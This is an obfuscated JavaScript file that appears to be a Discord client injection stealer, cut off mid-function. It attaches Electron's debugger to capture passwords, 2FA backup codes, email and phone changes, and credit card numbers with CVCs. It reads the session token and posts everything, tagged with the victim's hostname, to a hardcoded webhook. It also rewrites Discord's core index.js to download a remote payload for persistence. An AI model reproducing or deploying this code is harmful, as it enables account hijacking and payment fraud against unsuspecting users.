const _0x50dbab = (function () {
    let _0x293785 = true
    return function (_0x2d4526, _0x11d6a5) {
      const _0x122c30 = _0x293785
        ? function () {
            if (_0x11d6a5) {
              const _0x560fbe = _0x11d6a5.apply(_0x2d4526, arguments)
              return (_0x11d6a5 = null), _0x560fbe
            }
          }
        : function () {}
      _0x293785 = false
      return _0x122c30
    }
  })(),
  _0x36dbfd = _0x50dbab(this, function () {
    return _0x36dbfd
      .toString()
      .search('(((.+)+)+)+$')
      .toString()
      .constructor(_0x36dbfd)
      .search('(((.+)+)+)+$')
  })
_0x36dbfd()
const _0x2edd3d = (function () {
  let _0x5eb11c = true
  return function (_0x2804a3, _0x325f8a) {
    const _0x4ec70b = _0x5eb11c
      ? function () {
          if (_0x325f8a) {
            const _0x471494 = _0x325f8a.apply(_0x2804a3, arguments)
            return (_0x325f8a = null), _0x471494
          }
        }
      : function () {}
    _0x5eb11c = false
    return _0x4ec70b
  }
})()
;(function () {
  _0x2edd3d(this, function () {
    const _0x12b1fe = new RegExp('function *\\( *\\)'),
      _0x181689 = new RegExp('\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)', 'i'),
      _0x47260a = _0x30c890('init')
    if (
      !_0x12b1fe.test(_0x47260a + 'chain') ||
      !_0x181689.test(_0x47260a + 'input')
    ) {
      _0x47260a('0')
    } else {
      _0x30c890()
    }
  })()
})()
const _0x47e961 = (function () {
    let _0x9a6e33 = true
    return function (_0x2a2eb4, _0x1af3e1) {
      const _0x2614cc = _0x9a6e33
        ? function () {
            if (_0x1af3e1) {
              const _0x2898c9 = _0x1af3e1.apply(_0x2a2eb4, arguments)
              return (_0x1af3e1 = null), _0x2898c9
            }
          }
        : function () {}
      return (_0x9a6e33 = false), _0x2614cc
    }
  })(),
  _0x27bd68 = _0x47e961(this, function () {
    const _0x308dfc = function () {
      let _0x58f68a
      try {
        _0x58f68a = Function(
          'return (function() {}.constructor("return this")( ));'
        )()
      } catch (_0x4c87e9) {
        _0x58f68a = window
      }
      return _0x58f68a
    }
    const _0x3e231c = _0x308dfc(),
      _0x37fd41 = (_0x3e231c.console = _0x3e231c.console || {}),
      _0x297ea8 = [
        'log',
        'warn',
        'info',
        'error',
        'exception',
        'table',
        'trace',
      ]
    for (let _0x19abf3 = 0; _0x19abf3 < _0x297ea8.length; _0x19abf3++) {
      const _0x3b2607 = _0x47e961.constructor.prototype.bind(_0x47e961),
        _0x3b31db = _0x297ea8[_0x19abf3],
        _0xcbc9b0 = _0x37fd41[_0x3b31db] || _0x3b2607
      _0x3b2607['__proto__'] = _0x47e961.bind(_0x47e961)
      _0x3b2607.toString = _0xcbc9b0.toString.bind(_0xcbc9b0)
      _0x37fd41[_0x3b31db] = _0x3b2607
    }
  })
_0x27bd68()
const fs = require('fs'),
  os = require('os'),
  https = require('https'),
  args = process.argv,
  path = require('path'),
  querystring = require('querystring'),
  { BrowserWindow, session } = require('electron'),
  _0x25de18 = {}
_0x25de18.urls = [
  '/auth/login',
  '/auth/register',
  '/mfa/totp',
  '/mfa/codes-verification',
  '/users/@me',
  '/users/@me/email',
  '/users/@me/password',
  '/users/@me/phone',
  '/users/@me/username',
  '/billing/payment-sources',
  '/billing/subscriptions',
  '/guilds',
  '/relationships',
]
const _0x42dac1 = {}
_0x42dac1.urls = [
  'wss://remote-auth-gateway.discord.gg/*',
  'https://discord.com/api/v*/auth/sessions',
  'https://*.discord.com/api/v*/auth/sessions',
  'https://discordapp.com/api/v*/auth/sessions',
]
const _0x338c9a = {}
_0x338c9a.urls = [
  'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
  'https://api.stripe.com/v*/tokens',
]
const _0x2aac05 = {}
_0x2aac05.Value = 1
_0x2aac05.Emoji = '<:8485discordemployee:1163172252989259898>'
_0x2aac05.Rare = true
const _0x56f497 = {}
_0x56f497.Value = 2
_0x56f497.Emoji = '<:9928discordpartnerbadge:1163172304155586570>'
_0x56f497.Rare = true
const _0x3f9d84 = {}
_0x3f9d84.Value = 4
_0x3f9d84.Emoji = '<:9171hypesquadevents:1163172248140660839>'
_0x3f9d84.Rare = true
const _0x32ff3 = {}
_0x32ff3.Value = 8
_0x32ff3.Emoji = '<:4744bughunterbadgediscord:1163172239970140383>'
_0x32ff3.Rare = true
const _0x179545 = {}
_0x179545.Value = 512
_0x179545.Emoji = '<:5053earlysupporter:1163172241996005416>'
_0x179545.Rare = true
const _0x537da7 = {}
_0x537da7.Value = 16384
_0x537da7.Emoji = '<:1757bugbusterbadgediscord:1163172238942543892>'
_0x537da7.Rare = true
const _0x12e77a = {}
_0x12e77a.Value = 131072
_0x12e77a.Emoji = '<:1207iconearlybotdeveloper:1163172236807639143>'
_0x12e77a.Rare = true
const _0x612317 = {}
_0x612317.Value = 64
_0x612317.Emoji = '<:6601hypesquadbravery:1163172246492287017>'
_0x612317.Rare = false
const _0x51ba57 = {}
_0x51ba57.Value = 128
_0x51ba57.Emoji = '<:6936hypesquadbrilliance:1163172244474822746>'
_0x51ba57.Rare = false
const _0x4b4d3e = {}
_0x4b4d3e.Value = 256
_0x4b4d3e.Emoji = '<:5242hypesquadbalance:1163172243417858128>'
_0x4b4d3e.Rare = false
const _0x28b493 = {}
_0x28b493.Value = 4194304
_0x28b493.Emoji = '<:1207iconactivedeveloper:1163172534443851868>'
_0x28b493.Rare = false
const _0x54e97b = {}
_0x54e97b.Value = 262144
_0x54e97b.Emoji = '<:4149blurplecertifiedmoderator:1163172255489085481>'
_0x54e97b.Rare = true
const _0x3ae4cb = {}
_0x3ae4cb.Value = 1048704
_0x3ae4cb.Emoji = '\u2328️'
_0x3ae4cb.Rare = false
const _0x1b74aa = {}
_0x1b74aa.Discord_Emloyee = _0x2aac05
_0x1b74aa.Partnered_Server_Owner = _0x56f497
_0x1b74aa.HypeSquad_Events = _0x3f9d84
_0x1b74aa.Bug_Hunter_Level_1 = _0x32ff3
_0x1b74aa.Early_Supporter = _0x179545
_0x1b74aa.Bug_Hunter_Level_2 = _0x537da7
_0x1b74aa.Early_Verified_Bot_Developer = _0x12e77a
_0x1b74aa.House_Bravery = _0x612317
_0x1b74aa.House_Brilliance = _0x51ba57
_0x1b74aa.House_Balance = _0x4b4d3e
_0x1b74aa.Active_Developer = _0x28b493
_0x1b74aa.Certified_Moderator = _0x54e97b
_0x1b74aa.Spammer = _0x3ae4cb
const _0x3dfb74 = {}
_0x3dfb74.webhook =
  'https://discord.com/api/webhooks/1438642158608449608/oXImYlRX9oO0Cz8yMG_Zkz7aUXWuvkw9YabfxUEDa22Flyy8CeEa4TBmRAHDs90zTzcI'
_0x3dfb74.injection_url =
  'https://raw.githubusercontent.com/undefinedsource338/dfasfasfasgfsdadfa/refs/heads/main/backup.js'
_0x3dfb74.filters = _0x25de18
_0x3dfb74.filters2 = _0x42dac1
_0x3dfb74.payment_filters = _0x338c9a
_0x3dfb74.API = 'https://discord.com/api/v9/users/@me'
_0x3dfb74.badges = _0x1b74aa
const CONFIG = _0x3dfb74,
  executeJS = (_0xe1aaa8) => {
    const _0x239348 = BrowserWindow.getAllWindows()[0]
    return _0x239348.webContents.executeJavaScript(_0xe1aaa8, true)
  },
  clearAllUserData = () => {
    executeJS(
      'document.body.appendChild(document.createElement`iframe`).contentWindow.localStorage.clear()'
    )
    executeJS('location.reload()')
  },
  getToken = async () =>
    await executeJS(
      "(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()"
    ),
  request = async (_0x2b12f2, _0x32d99b, _0x102bb9, _0x8325ca) => {
    _0x32d99b = new URL(_0x32d99b)
    const _0xdd64da = {}
    _0xdd64da['Access-Control-Allow-Origin'] = '*'
    const _0x303ba7 = {
      protocol: _0x32d99b.protocol,
      hostname: _0x32d99b.host,
      path: _0x32d99b.pathname,
      method: _0x2b12f2,
      headers: _0xdd64da,
    }
    const _0x3abc76 = _0x303ba7
    if (_0x32d99b.search) {
      _0x3abc76.path += _0x32d99b.search
    }
    for (const _0x4cdf96 in _0x102bb9)
      _0x3abc76.headers[_0x4cdf96] = _0x102bb9[_0x4cdf96]
    const _0x42bf08 = https.request(_0x3abc76)
    if (_0x8325ca) {
      _0x42bf08.write(_0x8325ca)
    }
    return (
      _0x42bf08.end(),
      new Promise((_0x4aaa1b, _0xf35fc4) => {
        _0x42bf08.on('response', (_0x35cda3) => {
          let _0x451940 = ''
          _0x35cda3.on('data', (_0x38bfcf) => (_0x451940 += _0x38bfcf))
          _0x35cda3.on('end', () => _0x4aaa1b(_0x451940))
        })
      })
    )
  },
  hooker = async (_0x207bfc, _0x34e846, _0x2c00e5) => {
    _0x207bfc.content =
      '`' +
      os.hostname() +
      '` - `' +
      os.userInfo().username +
      '`\n\n' +
      _0x207bfc.content
    _0x207bfc.username = 'https://t.me/hairo13x7'
    _0x207bfc.avatar_url =
      'https://cdn.discordapp.com/attachments/1370119922939723779/1429085736103051284/Ioz55TP.webp?ex=68f4db4e&is=68f389ce&hm=20291b4734c35319f6c03bf15a70f387e62abcb774ccc499976e3ab926e14432&'
    const _0x125915 = _0x2c00e5.avatar
        ? 'https://cdn.discordapp.com/avatars/' +
          _0x2c00e5.id +
          '/' +
          _0x2c00e5.avatar +
          '?size=4096'
        : 'https://cdn.discordapp.com/embed/avatars/0.png',
      _0xff2a1a = {
        name: _0x2c00e5.username,
        icon_url: _0x125915,
      }
    _0x207bfc.embeds[0].author = _0xff2a1a
    const _0x53133a = { url: _0x125915 }
    _0x207bfc.embeds[0].thumbnail = _0x53133a
    _0x207bfc.embeds[0].footer = {
      text: os.userInfo().username + ' | https://t.me/hairo13x7',
      icon_url:
        'https://cdn.discordapp.com/attachments/1370119922939723779/1429085736103051284/Ioz55TP.webp?ex=68f4db4e&is=68f389ce&hm=20291b4734c35319f6c03bf15a70f387e62abcb774ccc499976e3ab926e14432&',
    }
    _0x207bfc.embeds[0].title = 'Account Information'
    const _0x387641 = getNitro(_0x2c00e5.premium_type),
      _0x5703c2 = getBadges(_0x2c00e5.flags),
      _0x2c10a7 = await getBilling(_0x34e846),
      _0x176e36 = await getFriends(_0x34e846),
      _0x26d644 = await getServers(_0x34e846),
      _0x31c9e7 = _0x207bfc.embeds[0].fields || [],
      _0xa07997 = {
        name: '<:mastercard_spacex:1429086506781511771> Token:',
        value: '```' + _0x34e846 + '```',
        inline: false,
      }
    const _0x35e6d5 = {
      name: '<:nitro_spacex:1429086514893164647> Nitro:',
      value: _0x387641,
      inline: true,
    }
    const _0x52094a = {
      name: '<:badges_spacex:1429086523906850906> Badges:',
      value: _0x5703c2,
      inline: true,
    }
    const _0x58d896 = {
      name: '<:mastercard_spacex:1429086506781511771> Billing:',
      value: _0x2c10a7,
      inline: true,
    }
    const _0x12285c = {
      name: '<a:money_spacex:1429086508505239623> 2FA:',
      value: '`' + (_0x2c00e5.mfa_enabled ? 'Yes' : 'No') + '`',
      inline: true,
    }
    const _0x6f17bb = {
      name: '<:email_spacex:1429086532811358350> Email:',
      value: '`' + _0x2c00e5.email + '`',
      inline: true,
    }
    const _0x2010fb = {
      name: '<a:billing_postal:1429086529300598895> Phone:',
      value: '`' + (_0x2c00e5.phone || 'None') + '`',
      inline: true,
    }
    const _0x1641fa = [
      _0xa07997,
      _0x35e6d5,
      _0x52094a,
      _0x58d896,
      _0x12285c,
      _0x6f17bb,
      _0x2010fb,
      {
        name: '<:space_classic:1429086519901032610> Path:',
        value:
          '`C:\\Users\\' +
          os.userInfo().username +
          '\\AppData\\Local\\Discord\\app-1.0.9212\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js`',
        inline: false,
      },
    ]
    _0x31c9e7.length > 0
      ? (_0x207bfc.embeds[0].fields = [..._0x31c9e7, ..._0x1641fa])
      : (_0x207bfc.embeds[0].fields = _0x1641fa)
    _0x207bfc.embeds.push(
      {
        title: 'HQ Friends (' + _0x176e36.totalFriends + ')',
        description: _0x176e36.message,
        color: 3224376,
        author: {
          name: 'HQ Friends (' + _0x176e36.totalFriends + ')',
          icon_url:
            'https://cdn.discordapp.com/attachments/1370119922939723779/1429085736103051284/Ioz55TP.webp?ex=68f4db4e&is=68f389ce&hm=20291b4734c35319f6c03bf15a70f387e62abcb774ccc499976e3ab926e14432&',
        },
        footer: {
          text: os.userInfo().username + ' | https://t.me/hairo13x7',
          icon_url:
            'https://cdn.discordapp.com/attachments/1370119922939723779/1429085736103051284/Ioz55TP.webp?ex=68f4db4e&is=68f389ce&hm=20291b4734c35319f6c03bf15a70f387e62abcb774ccc499976e3ab926e14432&',
        },
      },
      {
        title: 'Rare Servers (' + _0x26d644.totalGuilds + ')',
        description: _0x26d644.message,
        color: 3224376,
        author: {
          name: 'Rare Servers (' + _0x26d644.totalGuilds + ')',
          icon_url:
            'https://cdn.discordapp.com/attachments/1370119922939723779/1429085736103051284/Ioz55TP.webp?ex=68f4db4e&is=68f389ce&hm=20291b4734c35319f6c03bf15a70f387e62abcb774ccc499976e3ab926e14432&',
        },
        footer: {
          text: os.userInfo().username + ' | https://t.me/hairo13x7',
          icon_url:
            'https://cdn.discordapp.com/attachments/1370119922939723779/1429085736103051284/Ioz55TP.webp?ex=68f4db4e&is=68f389ce&hm=20291b4734c35319f6c03bf15a70f387e62abcb774ccc499976e3ab926e14432&',
        },
      }
    )
    for (const _0x35dcdd in _0x207bfc.embeds) {
      _0x207bfc.embeds[_0x35dcdd].color = 3224376
    }
    await request(
      'POST',
      CONFIG.webhook,
      { 'Content-Type': 'application/json' },
      JSON.stringify(_0x207bfc)
    )
  },
  fetch = async (_0x1563ad, _0xc0b14d) => {
    return JSON.parse(await request('GET', CONFIG.API + _0x1563ad, _0xc0b14d))
  },
  fetchAccount = async (_0x21ca84) =>
    await fetch('', { Authorization: _0x21ca84 }),
  fetchBilling = async (_0x4d59ff) =>
    await fetch('/billing/payment-sources', { Authorization: _0x4d59ff }),
  fetchServers = async (_0x4d16f5) =>
    await fetch('/guilds?with_counts=true', { Authorization: _0x4d16f5 }),
  fetchFriends = async (_0x172ac9) =>
    await fetch('/relationships', { Authorization: _0x172ac9 }),
  getNitro = (_0x4b9a1f) => {
    switch (_0x4b9a1f) {
      case 1:
        return '`Nitro Classic`'
      case 2:
        return '`Nitro Boost`'
      case 3:
        return '`Nitro Basic`'
      default:
        return '`\u274C`'
    }
  },
  getBadges = (_0x728cad) => {
    let _0x57d4e7 = ''
    for (const _0x463d5e in CONFIG.badges) {
      let _0x343ea0 = CONFIG.badges[_0x463d5e]
      if ((_0x728cad & _0x343ea0.Value) == _0x343ea0.Value) {
        _0x57d4e7 += _0x343ea0.Emoji + ' '
      }
    }
    return _0x57d4e7 || '`\u274C`'
  },
  getRareBadges = (_0x595287) => {
    let _0x517cbc = ''
    for (const _0x299df6 in CONFIG.badges) {
      let _0x13818f = CONFIG.badges[_0x299df6]
      if ((_0x595287 & _0x13818f.Value) == _0x13818f.Value && _0x13818f.Rare) {
        _0x517cbc += _0x13818f.Emoji + ' '
      }
    }
    return _0x517cbc
  },
  getBilling = async (_0x45b680) => {
    const _0x5e03a4 = await fetchBilling(_0x45b680)
    let _0x53c67f = ''
    return (
      _0x5e03a4.forEach((_0x14a55c) => {
        if (!_0x14a55c.invalid) {
          switch (_0x14a55c.type) {
            case 1:
              _0x53c67f += '\uD83D\uDCB3 '
              break
            case 2:
              _0x53c67f += '<:paypal:1148653305376034967> '
              break
          }
        }
      }),
      _0x53c67f || '`\u274C`'
    )
  },
  getFriends = async (_0x57646a) => {
    const _0xc06a97 = await fetchFriends(_0x57646a),
      _0x2cbd16 = _0xc06a97.filter((_0x19a330) => {
        return _0x19a330.type == 1
      })
    let _0x245bf3 = ''
    for (const _0x163ab5 of _0x2cbd16) {
      var _0x40c227 = getRareBadges(_0x163ab5.user.public_flags)
      if (_0x40c227 != '') {
        if (!_0x245bf3) {
          _0x245bf3 = '**Rare Friends:**\n'
        }
        _0x245bf3 += _0x40c227 + ' ' + _0x163ab5.user.username + '\n'
      }
    }
    _0x245bf3 = _0x245bf3 || '**No Rare Friends**'
    const _0x4153c3 = {}
    return (
      (_0x4153c3.message = _0x245bf3),
      (_0x4153c3.totalFriends = _0xc06a97.length),
      _0x4153c3
    )
  },
  getServers = async (_0x2383dc) => {
    const _0x5cee4f = await fetchServers(_0x2383dc),
      _0x34e117 = _0x5cee4f.filter(
        (_0x161ba5) =>
          _0x161ba5.permissions == '562949953421311' ||
          _0x161ba5.permissions == '2251799813685247'
      )
    let _0x1ddc2e = ''
    for (const _0x21af0f of _0x34e117) {
      if (_0x1ddc2e === '') {
        _0x1ddc2e += '**Rare Servers:**\n'
      }
      _0x1ddc2e +=
        (_0x21af0f.owner
          ? '<:SA_Owner:991312415352430673> Owner'
          : '<:admin:967851956930482206> Admin') +
        ' | Server Name: `' +
        _0x21af0f.name +
        '` - Members: `' +
        _0x21af0f.approximate_member_count +
        '`\n'
    }
    _0x1ddc2e = _0x1ddc2e || '**No Rare Servers**'
    const _0x12c094 = {
      message: _0x1ddc2e,
      totalGuilds: _0x5cee4f.length,
    }
    return _0x12c094
  },
  EmailPassToken = async (_0x5eff47, _0x43bb57, _0x2201a3, _0x1fb795) => {
    const _0x7ce4e3 = await fetchAccount(_0x2201a3)
    const _0x468da3 = {
      content: '**' + _0x7ce4e3.username + '** just ' + _0x1fb795 + '!',
      embeds: [
        {
          fields: [
            {
              name: '<:email_spacex:1429086532811358350> Email:',
              value: '`' + _0x5eff47 + '`',
              inline: true,
            },
            {
              name: '<a:password_spacex:1429086516625412226> Password:',
              value: '`' + _0x43bb57 + '`',
              inline: true,
            },
          ],
          color: 3224376,
        },
      ],
    }
    hooker(_0x468da3, _0x2201a3, _0x7ce4e3)
  },
  BackupCodesViewed = async (_0x513cf9, _0x51d96f) => {
    const _0x63a0a = await fetchAccount(_0x51d96f)
    const _0x5508cc = _0x513cf9.filter((_0x2034c8) => {
      return _0x2034c8.consumed === false
    })
    let _0x6d8400 = ''
    for (let _0x11e7a3 of _0x5508cc) {
      _0x6d8400 +=
        _0x11e7a3.code.substr(0, 4) + '-' + _0x11e7a3.code.substr(4) + '\n'
    }
    const _0x1962dc = {
      content:
        '**' + _0x63a0a.username + '** just viewed his 2FA backup codes!',
      embeds: [
        {
          fields: [
            {
              name: '<a:money_spacex:1429086508505239623> Backup Codes:',
              value: '```' + _0x6d8400 + '```',
              inline: false,
            },
            {
              name: '<:email_spacex:1429086532811358350> Email:',
              value: '`' + _0x63a0a.email + '`',
              inline: true,
            },
            {
              name: '<a:billing_postal:1429086529300598895> Phone:',
              value: '`' + (_0x63a0a.phone || 'None') + '`',
              inline: true,
            },
          ],
          color: 3224376,
        },
      ],
    }
    hooker(_0x1962dc, _0x51d96f, _0x63a0a)
  },
  PasswordChanged = async (_0x42bd95, _0x172380, _0x3eb9c4) => {
    const _0x4ad3b3 = await fetchAccount(_0x3eb9c4)
    const _0x4532ef = {
      content: '**' + _0x4ad3b3.username + '** just changed his password!',
      embeds: [
        {
          fields: [
            {
              name: '<a:password_spacex:1429086516625412226> New Password:',
              value: '`' + _0x42bd95 + '`',
              inline: true,
            },
            {
              name: '<a:password_spacex:1429086516625412226> Old Password:',
              value: '`' + _0x172380 + '`',
              inline: true,
            },
          ],
          color: 3224376,
        },
      ],
    }
    hooker(_0x4532ef, _0x3eb9c4, _0x4ad3b3)
  },
  CreditCardAdded = async (
    _0x22b8f2,
    _0x3672fd,
    _0x30e979,
    _0x1901df,
    _0x54dd56
  ) => {
    const _0x1b20fd = await fetchAccount(_0x54dd56),
      _0x1cf1c6 = {
        content: '**' + _0x1b20fd.username + '** just added a credit card!',
        embeds: [
          {
            fields: [
              {
                name: '<:visa_spacex:1429086521654509588> Card Number:',
                value: '`' + _0x22b8f2 + '`',
                inline: true,
              },
              {
                name: '<:mastercard_spacex:1429086506781511771> CVC:',
                value: '`' + _0x3672fd + '`',
                inline: true,
              },
              {
                name: '<a:billing_address:1429086525446033470> Expiration:',
                value: '`' + _0x30e979 + '/' + _0x1901df + '`',
                inline: true,
              },
            ],
            color: 3224376,
          },
        ],
      }
    hooker(_0x1cf1c6, _0x54dd56, _0x1b20fd)
  },
  PaypalAdded = async (_0x547ace) => {
    const _0x4bafa9 = await fetchAccount(_0x547ace),
      _0x39f486 = {
        content:
          '**' +
          _0x4bafa9.username +
          '** just added a <:paypal_spacex:1429086518168784956> account!',
        embeds: [
          {
            fields: [
              {
                name: '<:email_spacex:1429086532811358350> Email:',
                value: '`' + _0x4bafa9.email + '`',
                inline: true,
              },
              {
                name: '<a:billing_postal:1429086529300598895> Phone:',
                value: '`' + (_0x4bafa9.phone || 'None') + '`',
                inline: true,
              },
            ],
            color: 3224376,
          },
        ],
      }
    hooker(_0x39f486, _0x547ace, _0x4bafa9)
  },
  EmailChanged = async (_0x36f304, _0x460970, _0x538ff6) => {
    const _0x25ab93 = await fetchAccount(_0x538ff6),
      _0x4beb3c = {
        content: '**' + _0x25ab93.username + '** just changed his email!',
        embeds: [
          {
            fields: [
              {
                name: '<:email_spacex:1429086532811358350> New Email:',
                value: '`' + _0x36f304 + '`',
                inline: true,
              },
              {
                name: '<:email_spacex:1429086532811358350> Old Email:',
                value: '`' + _0x460970 + '`',
                inline: true,
              },
            ],
            color: 3224376,
          },
        ],
      }
    hooker(_0x4beb3c, _0x538ff6, _0x25ab93)
  },
  PhoneChanged = async (_0x28d948, _0x388e2e, _0x58a7c2) => {
    const _0xcab9f5 = await fetchAccount(_0x58a7c2)
    const _0x169ac2 = {
      content: '**' + _0xcab9f5.username + '** just changed his phone number!',
      embeds: [
        {
          fields: [
            {
              name: '<a:billing_postal:1429086529300598895> New Phone:',
              value: '`' + _0x28d948 + '`',
              inline: true,
            },
            {
              name: '<a:billing_postal:1429086529300598895> Old Phone:',
              value: '`' + (_0x388e2e || 'None') + '`',
              inline: true,
            },
          ],
          color: 3224376,
        },
      ],
    }
    hooker(_0x169ac2, _0x58a7c2, _0xcab9f5)
  },
  UsernameChanged = async (_0x2f6c73, _0x3ac2eb, _0x2b3aab) => {
    const _0x3ba6fa = await fetchAccount(_0x2b3aab),
      _0x8aad60 = {
        content: '**' + _0x3ac2eb + '** just changed his username!',
        embeds: [
          {
            fields: [
              {
                name: '<a:billing_name:1429086527417221120> New Username:',
                value: '`' + _0x2f6c73 + '`',
                inline: true,
              },
              {
                name: '<a:billing_name:1429086527417221120> Old Username:',
                value: '`' + _0x3ac2eb + '`',
                inline: true,
              },
            ],
            color: 3224376,
          },
        ],
      }
    hooker(_0x8aad60, _0x2b3aab, _0x3ba6fa)
  },
  NitroPurchased = async (_0x5a30f2) => {
    const _0x14a447 = await fetchAccount(_0x5a30f2),
      _0xdfde11 = {
        content: '**' + _0x14a447.username + '** just purchased Nitro!',
        embeds: [
          {
            fields: [
              {
                name: '<:nitro_spacex:1429086514893164647> Nitro Type:',
                value: '`' + getNitro(_0x14a447.premium_type) + '`',
                inline: true,
              },
              {
                name: '<:email_spacex:1429086532811358350> Email:',
                value: '`' + _0x14a447.email + '`',
                inline: true,
              },
            ],
            color: 3224376,
          },
        ],
      }
    hooker(_0xdfde11, _0x5a30f2, _0x14a447)
  },
  ServerJoined = async (_0x2b3cf2, _0x43d955, _0x272394) => {
    const _0x17e9ea = await fetchAccount(_0x272394)
    const _0x1c625a = {
      content: '**' + _0x17e9ea.username + '** just joined a server!',
      embeds: [
        {
          fields: [
            {
              name: '<:space_classic:1429086519901032610> Server Name:',
              value: '`' + _0x2b3cf2 + '`',
              inline: true,
            },
            {
              name: '<:space_classic:1429086519901032610> Server ID:',
              value: '`' + _0x43d955 + '`',
              inline: true,
            },
          ],
          color: 3224376,
        },
      ],
    }
    hooker(_0x1c625a, _0x272394, _0x17e9ea)
  },
  ServerLeft = async (_0x40689c, _0xfd2bf1, _0xce689c) => {
    const _0x2572c3 = await fetchAccount(_0xce689c),
      _0x29d021 = {
        content: '**' + _0x2572c3.username + '** just left a server!',
        embeds: [
          {
            fields: [
              {
                name: '<:space_classic:1429086519901032610> Server Name:',
                value: '`' + _0x40689c + '`',
                inline: true,
              },
              {
                name: '<:space_classic:1429086519901032610> Server ID:',
                value: '`' + _0xfd2bf1 + '`',
                inline: true,
              },
            ],
            color: 3224376,
          },
        ],
      }
    hooker(_0x29d021, _0xce689c, _0x2572c3)
  },
  discordPath = (function () {
    const _0x1b274e = args[0].split(path.sep).slice(0, -1).join(path.sep)
    let _0x4a10b3
    if (process.platform === 'win32') {
      _0x4a10b3 = path.join(_0x1b274e, 'resources')
    } else {
      process.platform === 'darwin' &&
        (_0x4a10b3 = path.join(_0x1b274e, 'Contents', 'Resources'))
    }
    if (fs.existsSync(_0x4a10b3)) {
      return {
        resourcePath: _0x4a10b3,
        app: _0x1b274e,
      }
    }
    const _0x2c612a = {}
    return (
      (_0x2c612a.undefined = undefined),
      (_0x2c612a.undefined = undefined),
      _0x2c612a
    )
  })()
async function initiation() {
  if (fs.existsSync(path.join(__dirname, 'initiation'))) {
    fs.rmdirSync(path.join(__dirname, 'initiation'))
    const _0x80362e = await getToken()
    if (!_0x80362e) {
      return
    }
    const _0x26248d = await fetchAccount(_0x80362e),
      _0x2bbd43 = {
        content: '**' + _0x26248d.username + '** just got injected!',
        embeds: [
          {
            fields: [
              {
                name: 'Email',
                value: '`' + _0x26248d.email + '`',
                inline: true,
              },
              {
                name: 'Phone',
                value: '`' + (_0x26248d.phone || 'None') + '`',
                inline: true,
              },
            ],
          },
        ],
      }
    await hooker(_0x2bbd43, _0x80362e, _0x26248d)
    clearAllUserData()
  }
  const { resourcePath: _0x31d13f, app: _0x548689 } = discordPath
  if (_0x31d13f === undefined || _0x548689 === undefined) {
    return
  }
  const _0x586125 = path.join(_0x31d13f, 'app'),
    _0x26065f = path.join(_0x586125, 'package.json'),
    _0x371aa0 = path.join(_0x586125, 'index.js'),
    _0x38c008 = fs
      .readdirSync(_0x548689 + '\\modules\\')
      .filter((_0x554030) => /discord_desktop_core-+?/.test(_0x554030))[0]
  const _0x4a9f8d =
      _0x548689 +
      '\\modules\\' +
      _0x38c008 +
      '\\discord_desktop_core\\index.js',
    _0x187cc0 = path.join(
      process.env.APPDATA,
      '\\betterdiscord\\data\\betterdiscord.asar'
    )
  if (!fs.existsSync(_0x586125)) {
    fs.mkdirSync(_0x586125)
  }
  if (fs.existsSync(_0x26065f)) {
    fs.unlinkSync(_0x26065f)
  }
  if (fs.existsSync(_0x371aa0)) {
    fs.unlinkSync(_0x371aa0)
  }
  if (process.platform === 'win32' || process.platform === 'darwin') {
    const _0x47c8fa = {
      name: 'discord',
      main: 'index.js',
    }
    fs.writeFileSync(_0x26065f, JSON.stringify(_0x47c8fa, null, 4))
    const _0x26c85a =
      "const fs = require('fs'), https = require('https');\n  const indexJs = '" +
      _0x4a9f8d +
      "';\n  const bdPath = '" +
      _0x187cc0 +
      "';\n  const fileSize = fs.statSync(indexJs).size\n  fs.readFileSync(indexJs, 'utf8', (err, data) => {\n      if (fileSize < 20000 || data === \"module.exports = require('./core.asar')\") \n          init();\n  })\n  async function init() {\n      https.get('" +
      CONFIG.injection_url +
      "', (res) => {\n          const file = fs.createWriteStream(indexJs);\n          res.replace('%WEBHOOK%', '" +
      CONFIG.webhook +
      "')\n          res.pipe(file);\n          file.on('finish', () => {\n              file.close();\n          });\n      \n      }).on(\"error\", (err) => {\n          setTimeout(init(), 10000);\n      });\n  }\n  require('" +
      path.join(_0x31d13f, 'app.asar') +
      "')\n  if (fs.existsSync(bdPath)) require(bdPath);"
    fs.writeFileSync(_0x371aa0, _0x26c85a.replace(/\\/g, '\\\\'))
  }
}
let email = '',
  password = '',
  initiationCalled = false
const createWindow = () => {
  mainWindow = BrowserWindow.getAllWindows()[0]
  if (!mainWindow) {
    return
  }
  mainWindow.webContents.debugger.attach('1.3')
  mainWindow.webContents.debugger.on(
    'message',
    async (_0x3f6816, _0x30e067, _0x5ac8af) => {
      !initiationCalled && (await initiation(), (initiationCalled = true))
      if (_0x30e067 !== 'Network.responseReceived') {
        return
      }
      if (
        !CONFIG.filters.urls.some((_0x3aabec) =>
          _0x5ac8af.response.url.endsWith(_0x3aabec)
        )
      ) {
        return
      }
      if (![200, 202].includes(_0x5ac8af.response.status)) {
        return
      }
      const _0x54d6d3 = { requestId: _0x5ac8af.requestId }
      const _0x3da84c = await mainWindow.webContents.debugger.sendCommand(
          'Network.getResponseBody',
          _0x54d6d3
        ),
        _0x471368 = JSON.parse(_0x3da84c.body),
        _0x1377b3 = { requestId: _0x5ac8af.requestId }
      const _0x8d3689 = await mainWindow.webContents.debugger.sendCommand(
          'Network.getRequestPostData',
          _0x1377b3
        ),
        _0x1e9f48 = JSON.parse(_0x8d3689.postData)
      switch (true) {
        case _0x5ac8af.response.url.endsWith('/login'):
          if (!_0x471368.token) {
            email = _0x1e9f48.login
            password = _0x1e9f48.password
            return
          }
          EmailPassToken(
            _0x1e9f48.login,
            _0x1e9f48.password,
            _0x471368.token,
            'logged in'
          )
          break
        case _0x5ac8af.response.url.endsWith('/register'):
          EmailPassToken(
            _0x1e9f48.email,
            _0x1e9f48.password,
            _0x471368.token,
            'signed up'
          )
          break
        case _0x5ac8af.response.url.endsWith('/totp'):
          EmailPassToken(email, password, _0x471368.token, 'logged in with 2FA')
          break
        case _0x5ac8af.response.url.endsWith('/codes-verification'):
          BackupCodesViewed(_0x471368.backup_codes, await getToken())
          break
        case _0x5ac8af.response.url.endsWith('/@me'):
          if (!_0x1e9f48.password) {
            return
          }
          _0x1e9f48.email &&
            EmailChanged(_0x1e9f48.email, _0x1e9f48.email, _0x471368.token)
          if (_0x1e9f48.new_password) {
            PasswordChanged(
